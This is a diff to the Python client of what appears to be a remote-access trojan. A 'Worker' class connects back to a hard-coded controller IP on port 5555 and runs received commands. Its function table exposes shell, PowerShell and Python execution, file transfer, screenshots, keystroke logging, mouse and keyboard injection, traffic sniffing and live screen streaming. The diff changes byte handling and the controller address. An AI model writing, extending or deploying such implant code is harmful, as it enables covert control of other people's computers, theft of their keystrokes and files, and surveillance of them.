@@ -132,15 +132,15 @@ class Worker:
             data += packet
         return data
 
-    def receiver(self) -> str:
+    def receiver(self) -> bytes:
         raw_size = self.recvall(4)
         if not raw_size:
-            return ""
+            return b""
         size = struct.unpack("I", raw_size)[0]
         if size == 0:
-            return ""
+            return b""
         message = self.recvall(size)
-        return message.decode()
+        return message
 
     def run(self):
         self.connect()
@@ -153,7 +153,8 @@ class Worker:
                 name = splitted[0].decode()
                 commend = splitted[1]
             else:
-                name = commend = data
+                name = data.decode()
+                commend = b"doesnt matter"
             if name == "send_file":
                 message = send_file(commend)
             else:
@@ -163,7 +164,7 @@ class Worker:
 
 
 def main():
-    ip = "10.0.0.10"
+    ip = "10.0.0.6"
     port = 5555
     functions:dict[str,Callable[[str],bytes]] = {"cmd":cmd,"powershell":powershell,"python":python, "send_file":send_file,"receive_file":receive_file, "screen_shot":screen_shot, "listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse,"sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
     worker = Worker(ip, int(port), functions)
